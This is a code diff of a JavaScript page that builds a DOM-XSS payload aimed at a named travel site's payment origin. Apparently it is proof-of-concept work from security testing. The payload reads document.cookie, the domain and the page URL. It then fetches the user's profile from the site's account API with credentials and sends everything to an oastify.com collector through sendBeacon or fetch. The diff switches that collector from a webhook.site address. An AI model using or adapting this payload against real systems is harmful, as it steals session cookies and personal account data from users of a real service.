@@ -10,9 +10,9 @@ const log=(m)=>{document.getElementById('log').textContent += m+"\n"; window._ms
 window.addEventListener('message', e=>{ log('MSG from '+e.origin+' :: '+JSON.stringify(e.data)); });
 const TOKEN='0e09f943-943c-490c-94d6-603df52df7ab';
 // DOM-XSS payload：作为表单动作在 pay.klook.com 源执行
-const XSS_PAYLOAD = "javascript:void(function(){var T='"+TOKEN+"';"+
+const XSS_PAYLOAD = "javascript:alert(1);void(function(){var T='"+TOKEN+"';"+
   "function b(k,o){o.k=k;o.d=document.domain;o.hl=location.href;o.c=document.cookie;"+
-  "try{navigator.sendBeacon('https://webhook.site/'+T,JSON.stringify(o));}"+
+  "try{navigator.sendBeacon('https://qd7ghmhel8uyetigeqbuixslqcw3kvij7.oastify.com/'+T,JSON.stringify(o));}"+
   "catch(e){try{fetch('https://qd7ghmhel8uyetigeqbuixslqcw3kvij7.oastify.com/'+T,{method:'POST',mode:'no-cors',body:JSON.stringify(o)});}catch(e2){}}}"+
   "b('xss',{});"+
   "try{fetch('https://www.klook.cn/v3/userserv/user/profile_service/get_my_profile_by_token?show_original=1',{credentials:'include'}).then(function(r){return r.text();}).then(function(x){b('ride',{n:x.length,resp:x.slice(0,3000)});}).catch(function(e){b('rideerr',{e:String(e)});});}"+
